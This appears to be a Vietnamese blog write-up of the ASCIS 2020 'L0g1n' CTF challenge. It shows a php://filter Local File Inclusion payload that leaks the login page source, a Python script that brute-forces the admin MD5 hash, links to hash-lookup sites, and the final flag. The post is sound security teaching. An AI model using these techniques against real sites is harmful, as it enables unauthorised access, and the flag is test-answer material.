---
title: "L0g1n - ASCIS 2020 "
date: 2020-10-18T11:18:29.946Z
draft: false
categories:
  - CTF
tags:
  - bruteforce
  - md5
  - php
---
Truy cập vào trang chủ ta được redirect từ \`http://34.87.32.27/\` => \`http://34.87.32.27/?page=home\`

Sau khi thử đăng ký và đăng nhập. Ta biết được form đăng ký không hoạt động nhưng khi đăng ký với username là admin thì hệ thống báo là user đã tồn tại. Vậy ta cần phải login được với username là admin.

![](/img/dyn3ran-imgur.png)

Theo pattern trong khung đăng ký ta biết được password nằm từ a đến h và 0 đến 9, password có thể từ 4 đến 7 kí tự.

Bây giờ ta có thể burteforce. Nhưng khoan đã, các trang ta truy cập đều có dạng \`?page=<tên trang>\` ta có thể đoán được trang được php require dựa trên tham số page trên url. Ta thử truy cập \`http://34.87.32.27/login.php\` thay vì \`http://34.87.32.27/?page=login\` để kiểm tra.

![](/img/wazk82w-imgur.png)

Tốt không hề có lỗi 404 Not Found. Ta thử khai thác Local File Inclusion của php. Truyền `php://filter/convert.base64-encode/resource=login` vào tham số page (xem thêm tại [đây](https://aadityapurani.com/2015/09/18/read-php-files-using-lfi-base-64-bypass/)). Ta được một đoạn base64 của source login.php

![](/img/4buj8i6-imgur.png)

Sau khi decode ra ta được source:

```php
<?php
if (!defined('check_access')) 
{
        die("<font color='red' size='5'>(￣^￣)ゞ Hi Comrade, Something Wrong!</font>");
}
?>
<html>
	<title> L0g1n </title>
	<body>
		<h1><font color="purple">🔑 Login</font></h1>
<?php

if(empty($_SESSION["form_token"]))
{
	$gen_token=md5(uniqid(rand(), true));
	$_SESSION["form_token"] = $gen_token;
}

echo '<h3>';

if(isset($_POST["username"]) && !empty($_POST["username"]) && isset($_POST["password"]) && !empty($_POST["password"]) && isset($_POST["token"]))
{
	if($_SESSION["form_token"]===$_POST["token"])
	{
  		unset($_SESSION['form_token']);
  		$_SESSION["form_token"] = md5(uniqid(rand(), true));
  		if ($_POST["username"] === "admin" && md5($_POST["password"]) === "c3cef6586e2e5705d9ed18ba8f4346c0")
  		{
  			$_SESSION['user'] = "admin";
  			print("Ok... Have a good day!");
  		}
  		else if ($_POST["username"] === "admin") 
  		{
  			print("Wrong Password, <font color='red'>(╯°-°)╯</font><font color='brown'>彡┻━┻</font>");
  		}
  		else
  		{
  			print("Wrong Username/Password<br><font color='blue'>‿︵‿︵‿︵‿</font><font color='red'>ヽ(°□° )ノ</font><font color='blue'>︵‿︵‿︵‿︵</font>");
  		}
	}
}
else 
{
	print("Hello, Login here <font color='green'>＼(＾▽＾)／</font>");
}

echo '</h3>';

?>

<?php
if(isset($_SESSION['user']) && $_SESSION['user']==="admin")
{
	print("Logged in");
}
else
{
$token = $_SESSION["form_token"];
$form = <<<EOF
		<form action="?page=login" method="POST">
			<br><strong>USERNAME</strong> <br><input type="text" name="username" /><br>
			<strong>PASSWORD</strong> <br><input type="password" name="password" /><br><br>
			<input type="hidden" name="token" value="$token" />
			<button type="submit" class="button1">Login</button>
		</form>
		Don't have an Account? Register <a href="?page=register">here</a>
EOF;
print($form);
}
?>

	</body>
</html>
```

Như vậy ta biết được username là admin và password sau khi băm md5 sẽ là `c3cef6586e2e5705d9ed18ba8f4346c0` giờ ta có thể burteforce md5:

```python
from itertools import product·
from hashlib import md5
br = False
for repeat in range(4, 8):
    per = product('abcdefgh0123456789', repeat=repeat);
    for password in (per):
        check = "".join(password)
        check = md5(check.encode()).hexdigest()
        if(check == 'c3cef6586e2e5705d9ed18ba8f4346c0'):
            print("".join(password))
            br = True
    if br:
        break
```

Hoặc nhanh hơn ta có thể kiểm tra md5 này đã được tìm ra chưa bằng các trang như [crackstation.net](https://crackstation.net/), [hashes.com](https://hashes.com/en/decrypt/hash), [cmd5.org](https://cmd5.org/), [hashtoolkit.com](https://hashtoolkit.com/), [gromweb.com](https://md5.gromweb.com/), [md5hashing.net](https://md5hashing.net/)

![](/img/8y0o5jw-imgur.png)

Và sau khi đăng nhập ta có được cờ bị che bằng font chữ trắng `ASCIS{__Hav3_Y0u_Heard_Ab0ut__HTML_PATT3rN?_}`

![](/img/twob6sb-imgur.png)